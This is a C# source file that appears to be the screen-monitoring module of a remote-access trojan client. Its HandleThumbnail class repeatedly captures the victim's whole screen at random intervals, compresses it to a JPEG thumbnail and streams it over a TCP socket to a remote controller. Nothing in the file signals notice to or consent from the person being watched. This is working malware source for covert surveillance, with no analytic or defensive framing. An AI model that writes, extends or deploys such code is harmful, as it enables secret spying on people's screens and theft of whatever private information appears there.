using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using MessagePack;

namespace Client.HandlePacket
{
    internal static class HandleThumbnail
    {
        public static bool isOn = false;
        public static void Start()
        {
            try
            {
                while (Program.TCP_Socket.IsConnected && isOn)
                {
                    Thread.Sleep(new Random().Next(1000, 3000));
                    var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                    using (var g = Graphics.FromImage(bmp))
                    using (var memoryStream = new MemoryStream())
                    {
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
                        var thumb = bmp.GetThumbnailImage(256, 256, () => false, IntPtr.Zero);
                        thumb.Save(memoryStream, ImageFormat.Jpeg);
                        var msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "thumbnail";
                        msgpack.ForcePathObject("Image").SetAsBytes(memoryStream.ToArray());
                        Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                        thumb.Dispose();
                    }
                    bmp.Dispose();
                }
            }
            catch (Exception ex)
            {
                isOn = false;
                Program.TCP_Socket.Log(ex.Message);
            }
        }
    }
}